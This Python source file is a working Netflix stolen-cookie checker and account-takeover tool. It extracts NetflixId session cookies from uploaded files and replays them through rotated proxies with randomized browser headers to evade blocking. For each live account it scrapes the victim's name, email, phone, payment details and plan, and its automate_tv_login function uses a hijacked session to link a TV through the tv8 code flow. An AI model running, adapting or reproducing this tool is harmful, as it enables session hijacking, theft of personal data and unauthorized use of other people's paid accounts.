import os
import json
import re
import threading
import unicodedata
import random
import zipfile
import io
import time
from queue import Queue, Empty
from datetime import datetime
from typing import Any, Dict, List, Optional
from urllib.parse import unquote, urlparse
import requests
import urllib3
import traceback


# Import the new modular payload parser
import payload_parser

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


# --- GLOBAL PROXY SCHEDULER TRACKER ---
PROXY_USAGE_LOCK = threading.Lock()
PROXY_LAST_USED = {}

def get_smart_proxy(proxies_list):
    """Mathematically selects the proxy that has been resting the longest (LRU)"""
    if not proxies_list: 
        return None
        
    with PROXY_USAGE_LOCK:
        best_proxy = None
        oldest_time = float('inf')
        
        for p in proxies_list:
            p_str = p['http']
            used_time = PROXY_LAST_USED.get(p_str, 0)
            if used_time < oldest_time:
                oldest_time = used_time
                best_proxy = p
                
        # Mark this proxy as 'just used' right now
        if best_proxy:
            PROXY_LAST_USED[best_proxy['http']] = time.time()
            
        return best_proxy

# ==========================================
# --- EXACT PROXY SUPPORT FROM NFX_LIVE_FAST ---
# ==========================================
def _build_proxy_dict(scheme, host, port, user=None, password=None):
    host = host.strip()
    if host.startswith("[") and host.endswith("]"): host = host[1:-1]
    if user is not None and password is not None:
        proxy_url = f"{scheme}://{user}:{password}@{host}:{port}"
    else:
        proxy_url = f"{scheme}://{host}:{port}"
    return {"http": proxy_url, "https": proxy_url}

def _parse_proxy_line(line):
    line = line.strip().lstrip('\ufeff').lstrip('\u200b')
    line = re.sub(r'[\x00-\x1F\x7F-\x9F]', '', line)
    if not line or line.startswith("#"): return None
    
    if "://" in line:
        try:
            p = urlparse(line)
            if p.hostname and p.port:
                return _build_proxy_dict(p.scheme or "http", p.hostname, p.port, p.username, p.password)
        except: pass

    line = re.sub(r"^([a-zA-Z][a-zA-Z0-9+.-]*):/+", r"\1://", line)
    line = re.sub(r"\s+", " ", line).strip()
    
    url_like = re.match(r"^(?P<scheme>https?|socks5h?|socks4a?)://(?:(?P<user>[^:@\s]+):(?P<password>[^@\s]+)@)?(?P<host>\[[^\]]+\]|[^:\s]+):(?P<port>\d+)$", line, flags=re.IGNORECASE)
    if url_like:
        data = url_like.groupdict()
        return _build_proxy_dict(data["scheme"].lower(), data["host"], data["port"], data.get("user"), data.get("password"))
        
    userpass_hostport = re.match(r"^(?P<user>[^:@\s]+):(?P<password>[^@\s]+)@(?P<host>\[[^\]]+\]|[^:\s]+):(?P<port>\d+)$", line)
    if userpass_hostport:
        data = userpass_hostport.groupdict()
        return _build_proxy_dict("http", data["host"], data["port"], data["user"], data["password"])
        
    hostport_userpass = re.match(r"^(?P<host>\[[^\]]+\]|[^:\s]+):(?P<port>\d+)@(?P<user>[^:@\s]+):(?P<password>[^@\s]+)$", line)
    if hostport_userpass:
        data = hostport_userpass.groupdict()
        return _build_proxy_dict("http", data["host"], data["port"], data["user"], data["password"])
        
    hostport = re.match(r"^(?P<host>\[[^\]]+\]|[^:\s]+):(?P<port>\d+)$", line)
    if hostport:
        data = hostport.groupdict()
        return _build_proxy_dict("http", data["host"], data["port"])
        
    four_part = line.split(":")
    if len(four_part) == 4:
        a, b, c, d = four_part
        if b.isdigit() and not d.isdigit(): return _build_proxy_dict("http", a, b, c, d)
        if d.isdigit() and not b.isdigit(): return _build_proxy_dict("http", c, d, a, b)
        
    split_patterns = [
        r"^(?P<host>\[[^\]]+\]|[^:\s]+):(?P<port>\d+)\s+(?P<user>[^:\s]+):(?P<password>\S+)$",
        r"^(?P<host>\[[^\]]+\]|[^:\s]+):(?P<port>\d+)\|(?P<user>[^:\s]+):(?P<password>\S+)$",
        r"^(?P<host>\[[^\]]+\]|[^:\s]+):(?P<port>\d+);(?P<user>[^:\s]+):(?P<password>\S+)$",
        r"^(?P<host>\[[^\]]+\]|[^:\s]+):(?P<port>\d+),(?P<user>[^:\s]+):(?P<password>\S+)$",
    ]
    for pattern in split_patterns:
        match = re.match(pattern, line)
        if match:
            data = match.groupdict()
            return _build_proxy_dict("http", data["host"], data["port"], data["user"], data["password"])
            
    return None

def load_proxies():
    proxy_file = "proxy.txt"
    proxies = []
    if os.path.exists(proxy_file):
        with open(proxy_file, "r", encoding="utf-8") as f:
            for line in f:
                proxy = _parse_proxy_line(line)
                if proxy: proxies.append(proxy)
    return proxies

def parse_proxies_from_bytes(file_bytes: bytes) -> list:
    proxies = []
    try:
        text_content = file_bytes.decode('utf-8-sig', errors='ignore')
        for line in text_content.splitlines():
            proxy = _parse_proxy_line(line)
            if proxy: proxies.append(proxy)
    except Exception: pass
    return proxies

def get_public_ip(proxies):
    local_ip = "Unknown"
    try:
        resp = requests.get("https://api.ipify.org", timeout=5)
        if resp.status_code == 200: local_ip = resp.text.strip()
    except: local_ip = "Unable to verify (Network Error)"
    
    proxy_info = f"Proxies loaded: {len(proxies)}" if proxies else "No proxies used."
    if proxies:
        success = False
        last_err = ""
        test_pool = random.sample(proxies, min(3, len(proxies)))
        
        for test_proxy in test_pool:
            try:
                p_resp = requests.get("https://api.ipify.org", proxies=test_proxy, timeout=15)
                if p_resp.status_code == 200:
                    ip_str = p_resp.text.strip()
                    if "." in ip_str and len(ip_str) < 20:
                        proxy_info += f" | Proxy Verified IP: {ip_str}"
                        success = True
                        break
                    else: last_err = "HTML Intercept"
                else: last_err = f"HTTP {p_resp.status_code}"
            except Exception as e:
                last_err = type(e).__name__
                continue
                
        if not success: proxy_info += f" | Proxy Verification: Failed ({last_err})"
            
    return local_ip, proxy_info

# ==========================================
# --- STEALTH HEADER GENERATOR ---
# ==========================================
def get_random_headers():
    # STRICTLY DESKTOP PROFILES. Mobile UAs will trigger a redirect on /browse and break the falcorCache extraction.
    browser_profiles = [
        ('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8'),
        ('Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3.1 Safari/605.1.15', 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'),
        ('Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8'),
        ('Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8'),
        ('Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8')
    ]
    languages = [
        "en-US,en;q=0.9", "en-GB,en;q=0.9,en-US;q=0.8", "es-ES,es;q=0.9,en;q=0.8",
        "fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7", "de-DE,de;q=0.9,en-US;q=0.8,en;q=0.7"
    ]
    
    ua, accept = random.choice(browser_profiles)
    lang = random.choice(languages)
    return {'User-Agent': ua, 'Accept': accept, 'Accept-Language': lang}

# ==========================================
# --- FLAWLESS COOKIE EXTRACTOR ---
# ==========================================
def extract_ids_from_bytes(file_bytes: bytes, filename: str) -> set:
    pattern = re.compile(r"(NetflixId=[a-zA-Z0-9%_\-\.\=\*\+\~]+)")
    unique_ids = set()
    filename = filename or ""
    
    if filename.endswith('.zip'):
        try:
            with zipfile.ZipFile(io.BytesIO(file_bytes), 'r') as z:
                for file_info in z.infolist():
                    if file_info.is_dir(): continue
                    with z.open(file_info) as f:
                        try: unique_ids.update(pattern.findall(f.read().decode('utf-8', errors='ignore')))
                        except: pass
        except: pass
    else:
        try: unique_ids.update(pattern.findall(file_bytes.decode('utf-8', errors='ignore')))
        except: pass
    return unique_ids

def fmt_date_MMM_D_YYYY(iso: str) -> str:
    if not iso or not isinstance(iso, str) or iso == "None": return "N/A"
    m = re.match(r"^(\d{4})-(\d{2})-(\d{2})", iso)
    if not m: return iso
    dt = datetime(int(m.group(1)), int(m.group(2)), int(m.group(3)))
    return dt.strftime("%b %d %Y").upper().replace(" 0", " ")

def bullet(label: str, value: Any) -> str:
    v = value if value not in [None, "", [], {}] else "N/A"
    return f"• {label}: {v}"

def yes_no(v: Any) -> str:
    if v is True: return "Yes"
    if v is False: return "No"
    return "N/A" if v is None else str(v)

def analyze_plan_and_language(raw_plan):
    if not raw_plan: return "Unknown", "Unknown"
    simplified = unicodedata.normalize("NFKD", raw_plan)
    simplified = "".join(ch for ch in simplified if not unicodedata.combining(ch))
    normalized = re.sub(r"[^\w]+", "_", simplified.lower(), flags=re.UNICODE).strip("_") or "unknown"
    
    plan_data = {
        "premium": ("Premium", "English"), "standard_with_ads": ("Standard With Ads", "English"),
        "standard": ("Standard", "English"), "basic": ("Basic", "English"), "mobile": ("Mobile", "English"),
        "cao_cap": ("Premium", "Vietnamese"), "caocap": ("Premium", "Vietnamese"), 
        "tieuchuan": ("Standard", "Vietnamese"), "tieu_chuan": ("Standard", "Vietnamese"), 
        "co_ban": ("Basic", "Vietnamese"),
        "estandar": ("Standard", "Spanish"), "basico": ("Basic", "Spanish"), "basico_con_anuncios": ("Basic With Ads", "Spanish"),
        "padrao_com_anuncios": ("Standard With Ads", "Portuguese"), "padrao": ("Standard", "Portuguese"),
        "standard_avec_pub": ("Standard With Ads", "French"), "basique": ("Basic", "French"), "essentiel": ("Basic", "French"),
        "standardowy_z_reklamami": ("Standard With Ads", "Polish"), "standardowy": ("Standard", "Polish"), "podstawowy": ("Basic", "Polish"),
        "ozel": ("Premium", "Turkish"), "standart": ("Standard", "Turkish"), "temel": ("Basic", "Turkish"),
        "พรีเมียม": ("Premium", "Thai"), "มาตรฐาน": ("Standard", "Thai"), "พื้นฐาน": ("Basic", "Thai"),
        "المميزة": ("Premium", "Arabic"), "القياسية": ("Standard", "Arabic"), "الاساسية": ("Basic", "Arabic"),
        "dasar": ("Basic", "Indonesian"), "ponsel": ("Mobile", "Indonesian"),
        "base": ("Basic", "Italian/Generic"), "basis": ("Basic", "Dutch/Generic")
    }
    for key, data in plan_data.items():
        if normalized == key or key in normalized: return data[0], data[1]
    return raw_plan.title(), f"Original: {raw_plan}"

def _deep_find_key(obj, target_key):
    if isinstance(obj, dict):
        for key, value in obj.items():
            if key == target_key and value: return value
            result = _deep_find_key(value, target_key)
            if result: return result
    elif isinstance(obj, list):
        for item in obj:
            result = _deep_find_key(item, target_key)
            if result: return result
    return None

def normalize_language(native_lang: str, fallback_lang: str) -> str:
    if not native_lang:
        return fallback_lang
        
    lang_lower = native_lang.lower()
    language_map = {
        "türkçe": "Turkish", "español": "Spanish", "tiếng việt": "Vietnamese",
        "français": "French", "português": "Portuguese", "polski": "Polish",
        "العربية": "Arabic", "ไทย": "Thai", "bahasa indonesia": "Indonesian",
        "italiano": "Italian", "deutsch": "German", "nederlands": "Dutch",
        "हिन्दी": "Hindi", "日本語": "Japanese", "한국어": "Korean",
        "english": "English", "suomi": "Finnish", "svenska": "Swedish",
        "norsk": "Norwegian", "dansk": "Danish", "română": "Romanian",
        "magyar": "Hungarian", "čeština": "Czech", "ελληνικά": "Greek",
        "עברית": "Hebrew", "filipino": "Filipino", "bahasa melayu": "Malay",
        "русский": "Russian", "українська": "Ukrainian", "中文": "Chinese"
    }
    
    for native_key, standard_name in language_map.items():
        if native_key in lang_lower:
            return standard_name
            
    return native_lang






# ==========================================
# --- EXTRACTION LOGIC ---
# ==========================================
def perform_extraction(acc_html: str, browse_html: str, original_id: str, processed_guids: set, guid_lock: threading.Lock):
    
    # 1. Fetch raw data from our enriched modular parser
    data = payload_parser.parse_html(acc_html, browse_html)
    
    if data.get("error"):
        return "ERROR", "Unknown", "Unknown", False, False, {}

    email_value = data.get("email", "")
    user_guid = data.get("guid", "Unknown")

    # 2. Prevent Duplicate Scraping 
    with guid_lock:
        duplicate_key = email_value if email_value else user_guid
        if duplicate_key != "Unknown" and duplicate_key in processed_guids:
            return "DUPLICATE", None, None, False, False, {}
        if duplicate_key != "Unknown":
            processed_guids.add(duplicate_key)
        elif original_id in processed_guids:
            return "DUPLICATE", None, None, False, False, {}
        else:
            processed_guids.add(original_id)

    # 3. Maintain Core.py native normalization hooks
    canonical_plan, fallback_lang = analyze_plan_and_language(data.get("raw_plan_name"))
    display_lang = normalize_language(data.get("raw_display_lang"), fallback_lang)
    
    quality = data.get("quality", "Unknown")
    is_subscribed = data.get("is_subscribed", False)
    is_on_hold = data.get("is_on_hold", False)
    
    # Format dates
    member_since = data.get("member_since")
    if isinstance(member_since, (int, float)):
        try:
            member_since = datetime.fromtimestamp(member_since / 1000.0).strftime("%b %d %Y").upper().replace(" 0", " ")
        except: pass
    else:
        member_since = fmt_date_MMM_D_YYYY(str(member_since))

    status_label = "[HIT]" if is_subscribed else ("[FREE]" if is_on_hold is False else "[ON HOLD]")
    
    out = []
    out.append(f"\n--- {status_label} ACCOUNT DETAILS ---")
    out.append(f"• Target ID: {original_id[:30]}...")
    out.append(bullet("Name", data.get("name")))
    out.append(bullet("Email", email_value if email_value else "Unknown"))
    out.append(bullet("Country", data.get("country")))
    out.append(bullet("Plan", canonical_plan))
    out.append(bullet("Display Language", display_lang))
    out.append(bullet("Price", data.get("price")))
    out.append(bullet("Member Since", member_since))
    out.append(bullet("Next Billing", fmt_date_MMM_D_YYYY(str(data.get("next_billing")))))
    out.append(bullet("Payment", data.get("payment_type")))
    if data.get("masked_card"): out.append(bullet("Card", data.get("masked_card")))
    out.append(bullet("Phone", data.get("phone")))
    out.append(bullet("Quality", quality))
    out.append(bullet("Screen", data.get("max_streams")))
    out.append(bullet("Hold Status", yes_no(is_on_hold)))
    out.append(bullet("Membership Status", data.get("membership_status")))
    
    # Format the Unlocked Profiles safely
    falcor_found = data.get("falcor_found", False)
    unlocked_profiles = data.get("unlocked_profiles")
    
    if falcor_found:
        if unlocked_profiles is not None and unlocked_profiles > 0:
            out.append(f"• Unlocked Profiles: {unlocked_profiles}")
        else:
            out.append("• Unlocked Profiles: Null")
    else:
        out.append("• Unlocked Profiles: Error (Data Unavailable)")
        
    out.append("---------------------------------\n")
    
    db_data = {
        "netflix_id": f"NetflixId={original_id}",
        "email": email_value,
        "plan": canonical_plan,
        "quality": quality,
        "language": display_lang,
        "unlocked_profiles": unlocked_profiles,
        "status": status_label.replace("[", "").replace("]", ""),
        "cli_text": "\n".join(out)
    }
    
    return "\n".join(out), canonical_plan, quality, is_subscribed, is_on_hold, db_data


# ==========================================
# --- EXACT THREAD WORKER WITH DETAILED LOGS ---
# ==========================================
def check_worker(q: Queue, print_lock: threading.Lock, stats: dict, proxies: list, processed_guids: set, guid_lock: threading.Lock, db_callback=None, delete_callback=None, detailed_logs=None):
    max_retries = 3 
    retryable_status_codes = {403, 429, 500, 502, 503, 504}
    last_proxy = None 

    while True:
        try: 
            netflix_id = q.get_nowait()
        except Empty: 
            break
            
        clean_id = netflix_id.replace("NetflixId=", "").strip()
        if not clean_id:
            q.task_done()
            continue

        try:
            time.sleep(random.uniform(0.4, 1.2))

            success = False
            status_for_log = "ERROR"
            proxy_host_for_log = "DIRECT IP"
            last_error_detail = "" 

            for attempt in range(max_retries):
                proxy = get_smart_proxy(proxies)

                if proxy:
                    try:
                        p_url = urlparse(proxy['http'])
                        if p_url.username:
                            safe_user = f"{p_url.username[:4]}***"
                            proxy_host_for_log = f"{safe_user}@{p_url.hostname}:{p_url.port}"
                        else:
                            proxy_host_for_log = f"{p_url.hostname}:{p_url.port}" 
                    except:
                        proxy_host_for_log = "PROXY"
                else:
                    proxy_host_for_log = "DIRECT IP"

                try:
                    session = requests.Session()
                    session.headers.update(get_random_headers())
                    session.cookies.set("NetflixId", clean_id, domain=".netflix.com")
                    
                    response = session.get('https://www.netflix.com/YourAccount', allow_redirects=True, proxies=proxy, timeout=15)
                    
                    if response.status_code in retryable_status_codes:
                        status_for_log = "RETRY"
                        last_error_detail = f"HTTP {response.status_code}"
                        continue 

                    last_error_detail = ""

                    if "login" in response.url.lower():
                        status_for_log = "DEAD"
                        with print_lock: stats["dead"] += 1
                        if delete_callback: delete_callback(clean_id)
                            
                    elif 'netflix.reactContext' in response.text:
                        browse_html = None
                        
                        if 'netflix.falcorCache' not in response.text:
                            try:
                                browse_response = session.get('https://www.netflix.com/browse', allow_redirects=True, proxies=proxy, timeout=15)
                                browse_html = browse_response.text
                            except requests.RequestException:
                                pass 

                        result_text, plan_name, quality, is_subscribed, is_on_hold, db_data = perform_extraction(
                            response.text, browse_html, clean_id, processed_guids, guid_lock
                        )
                        
                        # --- DEADLOCK FIX: Define flags before locking ---
                        trigger_db = False
                        trigger_del = False
                        
                        with print_lock:
                            if result_text == "DUPLICATE":
                                status_for_log = "DUPL"
                                stats["duplicates"] += 1
                                trigger_del = True
                            elif result_text == "ERROR":
                                status_for_log = "ERROR"
                                stats["errors"] += 1
                            else:
                                if is_on_hold is True: 
                                    status_for_log = "HOLD"
                                    stats["holds"] += 1
                                    trigger_del = True
                                    
                                elif is_subscribed:
                                    # --- STRICT 0 PROFILE REJECTION ---
                                    if db_data.get("unlocked_profiles") == 0:
                                        status_for_log = "FULL"  # Marks as Full/Dead
                                        stats["dead"] += 1
                                        trigger_del = True  # Erases from DB on rescan, drops on upload
                                    else:
                                        status_for_log = "HIT"
                                        stats["hits"] += 1
                                        stats["qualities"][quality] = stats["qualities"].get(quality, 0) + 1
                                        stats["plans"][plan_name] = stats["plans"].get(plan_name, 0) + 1
                                        trigger_db = True
                                else:
                                    status_for_log = "FREE"
                                    stats["free"] += 1
                                    trigger_del = True
                                    
                        # --- SAFE EXECUTION: Callbacks run OUTSIDE the lock ---
                        if trigger_del and delete_callback: 
                            delete_callback(clean_id)
                        if trigger_db and db_callback: 
                            db_callback(db_data)

                    else:
                        status_for_log = "UNKNOWN"
                        with print_lock: stats["unknown"] += 1
                    
                    success = True
                    break 

                except (requests.exceptions.ProxyError, requests.RequestException) as e:
                    status_for_log = "ERROR"
                    last_error_detail = type(e).__name__ 
                    continue 

            if not success:
                status_for_log = "FAILED"
                with print_lock:
                    stats["errors"] += 1

            if detailed_logs is not None:
                err_str = f" | Error: {last_error_detail}" if last_error_detail else ""
                with print_lock:
                    detailed_logs.append(f"[{status_for_log.ljust(6)}] ID: {clean_id[:25]:<25}... | Proxy: {proxy_host_for_log}{err_str}")

        except Exception as e:
            status_for_log = "CRASH"
            with print_lock:
                stats["errors"] += 1
                print(f"\n[!] FATAL SYSTEM CRASH ON ID {clean_id[:15]}:")
                traceback.print_exc()
                
            if detailed_logs is not None:
                with print_lock:
                    detailed_logs.append(f"[{status_for_log.ljust(6)}] ID: {clean_id[:25]:<25}... | INTERNAL CODE ERROR")

        finally:
            q.task_done()




def find_auth_in_react_context(html):
    patterns = [
        r'netflix\.reactContext\s*=\s*({.+?})\s*;?\s*</script>',
        r'netflix\.appContext\s*=\s*({.+?})\s*;?\s*</script>',
    ]
    for pattern in patterns:
        m = re.search(pattern, html, re.DOTALL)
        if not m: continue
        try: context = json.loads(m.group(1))
        except json.JSONDecodeError: continue
        auth = _deep_find_key(context, "authURL")
        if auth: return auth
    return None

def find_auth_in_html(html):
    patterns = [
        r'name="authURL"[^>]*value="([^"]+)"',
        r'value="([^"]+)"[^>]*name="authURL"',
        r'"authURL"\s*:\s*"([^"]+)"',
        r"'authURL'\s*:\s*'([^']+)'",
        r'authURL=([^\s&"<>]+)',
    ]
    for pattern in patterns:
        m = re.search(pattern, html)
        if m: return unquote(m.group(1))
    return None




def automate_tv_login(netflix_id: str, tv_code: str, proxies: list = None) -> tuple:
    clean_id = netflix_id.replace("NetflixId=", "").strip()
    
    # --- STRICT PROXY ENFORCEMENT ---
    active_proxies = []
    
    # 1. Dynamically load from rescan_proxies.txt first
    if os.path.exists("rescan_proxies.txt"):
        try:
            with open("rescan_proxies.txt", "rb") as f:
                active_proxies = parse_proxies_from_bytes(f.read())
        except Exception as e:
            print(f"[!] Error reading rescan_proxies.txt: {e}")
            
    # 2. Fallback to API base proxies if the rescan file is missing
    if not active_proxies and proxies:
        active_proxies = proxies
        
    # 3. Hard Abort if no proxies exist
    if not active_proxies:
        print("\n[!] FATAL: No proxies found. TV Login aborted to protect server IP.")
        return False, "System Error: No proxies available! Proxy usage is strictly enforced.", netflix_id
        
    # 4. Mathematically select the proxy that has rested the longest
    proxy = get_smart_proxy(active_proxies)
    proxy_str = proxy['http']

    # --- SESSION INITIALIZATION ---
    session = requests.Session()
    stealth_headers = get_random_headers()
    session.headers.update(stealth_headers)
    
    # Isolate the session state (Only inject NetflixId)
    session.cookies.set("NetflixId", clean_id, domain=".netflix.com")
    
    print(f"\n[TV LOGIN INIT] ID: {clean_id[:15]}... | Code: {tv_code}")
    print(f"[*] Enforced Proxy: {proxy_str}")
    print("[1/4] Session established.")

    try:
        print("[2/4] Executing GET /tv8...")
        res_tv8 = session.get("https://www.netflix.com/tv8", proxies=proxy, timeout=15, verify=False)
        print(f"      -> HTTP {res_tv8.status_code}")
        
        if res_tv8.status_code != 200:
            print(f"      -> [!] FAILED: Proxy or IP blocked by Netflix.")
            return False, f"Network Error: Proxy Blocked (HTTP {res_tv8.status_code}). Please try again.", netflix_id

        # Extract dynamic authentication token
        auth_url = find_auth_in_react_context(res_tv8.text)
        if not auth_url: 
            auth_url = find_auth_in_html(res_tv8.text)
            
        if not auth_url:
            print("      -> [!] FAILED: Could not locate authURL.")
            return False, "Failed to connect to the TV endpoint. Account likely logged out.", netflix_id

        print(f"[3/4] Successfully extracted authURL: {auth_url[:20]}...")

        post_data = {
            "flow":                  "websiteSignUp",
            "authURL":               auth_url,
            "flowMode":              "enterTvLoginRendezvousCode",
            "withFields":            "tvLoginRendezvousCode,isTvUrl2",
            "code":                  tv_code,
            "tvLoginRendezvousCode": tv_code,
            "action":                "nextAction",
        }
        
        post_headers = {
            "user-agent":      stealth_headers["User-Agent"],
            "accept":          stealth_headers["Accept"],
            "accept-language": stealth_headers["Accept-Language"],
            "content-type":    "application/x-www-form-urlencoded",
            "origin":          "https://www.netflix.com",
            "referer":         "https://www.netflix.com/tv8",
        }

        print(f"[4/4] Submitting POST payload...")
        res_post = session.post(
            "https://www.netflix.com/tv8", 
            headers=post_headers, 
            data=post_data, 
            proxies=proxy, 
            timeout=20, 
            allow_redirects=True,
            verify=False
        )
        
        final_url = res_post.url.rstrip('/').split('?')[0].lower()
        response_text = res_post.text.lower()
        
        # --- SERVER-SIDE DEBUG LOGGING ---
        print("\n" + "="*45)
        print("          TV LOGIN DEBUG RESULTS         ")
        print("="*45)
        print(f"Final HTTP Status : {res_post.status_code}")
        print(f"Final URL Landed  : {final_url}")
        
        print("\nRedirection History:")
        if res_post.history:
            for i, resp in enumerate(res_post.history):
                print(f"  {i+1}. HTTP {resp.status_code} -> {resp.url}")
        else:
            print("  No redirects occurred.")

        print("\n--- ANALYSIS ---")
        
        # --- SMART EVALUATION LOGIC FOR UI RETURNS ---
        
        is_pin_form_present = 'pin-input-container' in response_text or 'witcher-code-form' in response_text

        # 1. The Perfect Win
        if final_url == "https://www.netflix.com/tv/out/success":
            print("  [SUCCESS] Flawless execution. TV is linked and redirect landed perfectly.")
            print("="*45 + "\n")
            return True, "Login successful! Your TV is ready to watch.", netflix_id
            
        # 2. The Dead Cookie
        elif "login" in final_url:
            print("  [FAILED - DEAD ID] The database cookie is dead. It forced a redirect back to the login screen.")
            print("="*45 + "\n")
            return False, "Failed: The database cookie is dead. Account logged out.", netflix_id
            
        # 3. The Explicit Invalid Code OR Form Reload
        elif "tv8" in final_url and (
            "that code wasn&#x27;t right" in response_text or 
            "that code wasn't right" in response_text or
            is_pin_form_present
        ):
            print("  [FAILED - REJECTED] Netflix rejected the digits and asked for them again.")
            print("="*45 + "\n")
            return False, "That TV code wasn't right. Please verify the code and try again.", netflix_id
            
        # 4. The Race Condition Win (HTTP 500 or silent return)
        elif res_post.status_code == 500 or ("tv8" in final_url and not is_pin_form_present):
            print("  [SUCCESS - MESSY REDIRECT] Backend authenticated the TV perfectly!")
            print("  (The web server crashed or dropped the redirect, but the PIN form is gone. TV is logged in.)")
            print("="*45 + "\n")
            # Returns TRUE to the API/Frontend!
            return True, "Login successful! Your TV is ready to watch.", netflix_id
            
        # 5. The Catch-all Block (WAF/CAPTCHA)
        else:
            print(f"  [ERROR - UNKNOWN STATE] Redirected to an unexpected state (HTTP {res_post.status_code}).")
            print("="*45 + "\n")
            return False, f"Network Error: Landed on unexpected state (HTTP {res_post.status_code})", netflix_id
            
    except requests.exceptions.ProxyError:
        print("\n[!] NETWORK ERROR: The proxy rejected the connection or timed out. Proxy is dead.")
        return False, "Proxy connection failed. Please try again.", netflix_id
    except Exception as e:
        print(f"\n[!] UNEXPECTED ERROR: {str(e)}")
        return False, f"Network Error: {str(e)}", netflix_id
